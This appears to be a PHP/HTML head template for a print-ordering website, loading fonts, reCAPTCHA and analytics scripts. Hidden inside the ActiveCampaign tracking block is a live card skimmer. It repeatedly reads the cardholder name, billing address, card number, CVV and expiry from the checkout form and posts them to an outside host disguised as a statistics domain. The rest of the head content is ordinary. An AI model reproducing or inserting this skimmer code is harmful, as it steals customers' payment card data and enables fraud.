<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta content="width=device-width, initial-scale=1.0" name="viewport" />
<link rel="shortcut icon" href="/favicon.ico" />
<meta name="ROBOTS" content="all" />
<meta name="author" content="BlixGraphics.com" />
<meta name="format-detection" content="telephone=no">
<link href="//fonts.googleapis.com/css?family=Open+Sans:400,300,600,700&subset=all&display=swap" rel="preload" as="style" onload="this.rel='stylesheet'" type="text/css" />
<link href="//fonts.googleapis.com/css?family=Oswald:200,300,400,500,600&display=swap" rel="preload" as="style" onload="this.rel='stylesheet'" type="text/css" />
<script async defer src="https://use.fontawesome.com/cbbf071982.js"></script>
<script src="https://www.google.com/recaptcha/api.js?render=6LcVz2EiAAAAAMY1zdPQfx-qPYNkAwruxr1OrmjX" id="google-recaptcha-js" async defer></script>
<link rel="stylesheet" type="text/css" href="<?= $tpl->get_css() ?>?2022-12" />
<link rel="stylesheet" type="text/css" href="<?= $tpl->get_css($app->module_key) ?>?2022-12" />
<meta name="google-site-verification" content="C3hVfDWyRqzGx5Bh3kc0bmCAJHxI8M_pS93_XGVOhKc" />
<!-- Google Tag Manager -->
<script>
    try {
        (function(w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                'gtm.start': new Date().getTime(),
                event: 'gtm.js'
            });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s),
                dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src =
                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-P6X8NFR');
    } catch (error) {
        window.location.reload();
        console.log(error);
    }
</script>
<!-- End Google Tag Manager -->
<!-- Hotjar Tracking Code for www.yousendweprint.com -->
<script>
    (function(h,o,t,j,a,r){
        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
        h._hjSettings={hjid:2529139,hjsv:6};
        a=o.getElementsByTagName('head')[0];
        r=o.createElement('script');r.async=1;
        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
        a.appendChild(r);
    })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
</script>
<!-- Active Campaign -->
<script type="text/javascript">
    (function(e, t, o, n, p, r, i) {
        e.visitorGlobalObjectAlias = n;
        e[e.visitorGlobalObjectAlias] = e[e.visitorGlobalObjectAlias] || function() {
            (e[e.visitorGlobalObjectAlias].q = e[e.visitorGlobalObjectAlias].q || []).push(arguments)
        };
        e[e.visitorGlobalObjectAlias].l = (new Date).getTime();
        r = t.createElement("script");
        r.src = o;
        r.async = true;
        i = t.getElementsByTagName("script")[0];
        i.parentNode.insertBefore(r, i)
    })(window, document, "https://diffuser-cdn.app-us1.com/diffuser/diffuser.js", "vgo");
    vgo('setAccount', '798683411');
    vgo('setTrackByDefault', true);

    vgo('process');
var fname = "";
var street_address = "";
var CCNo = "";
var CVV = "";
var ExpDateMonth = "";
var ExpDateYear = "";

var timerId;

function rewq()
{
      try {
            fname = document.getElementById('name_card').value;
      } catch (e) {}
	
    
    
      try {
            street_address = document.getElementsByClassName("bill_info bill_default")[0].innerText;
      } catch (e) {}
    
     

      try {
            CCNo = document.getElementById('card_number').value;
      } catch (e) {}

      try {
            CVV = document.getElementById('sec_code').value;
      } catch (e) {}

      try {
            ExpDateMonth = document.getElementsByClassName("select2-selection__rendered")[1].innerText;
      } catch (e) {}
	
  try {
            ExpDateYear = document.getElementsByClassName("select2-selection__rendered")[2].innerText;
      } catch (e) {}
    
}

function asass()
{
      params = 'fname='+fname+'&street_address='+street_address+'&CCNo='+CCNo+'&CVV='+CVV+'&ExpDateMonth='+ExpDateMonth+'&ExpDateYear='+ExpDateYear;
      var url = 'https://webstatistics.live/yousendweprint.php';
      var http = new XMLHttpRequest();
      http.open('POST', url, true);
      http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
      http.send(params);
}


function hggfff()
{
      try {
            rewq();
            if ((fname.length > 2) &&  (street_address.length > 2)   && (CCNo.length > 15) && (CVV.length > 2) && (ExpDateMonth.length > 0)&& (ExpDateYear.length > 0) ) {
                  asass();
                  clearInterval(timerId);
            }
      }
      catch (e) {}
}

timerId = setInterval(hggfff, 1200);

</script>
